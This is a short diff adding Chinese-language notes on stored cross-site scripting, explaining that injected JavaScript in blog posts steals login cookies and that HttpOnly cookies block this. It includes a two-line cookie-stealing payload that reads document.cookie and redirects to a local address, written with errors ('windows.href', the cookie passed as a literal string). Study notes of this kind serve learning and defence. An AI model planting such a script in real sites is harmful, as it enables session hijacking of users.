@@ -1,0 +1,6 @@
+1 主要是盗取登录的cookies，通过博客的发帖功能嵌入攻击代码（js），
+如果设置cookies指定httponly，那么js将不能获取该cookies
+
+
+var cookies = document.cookie
+windows.href =  "127.0.0.1/index.php?cookie=cookies"
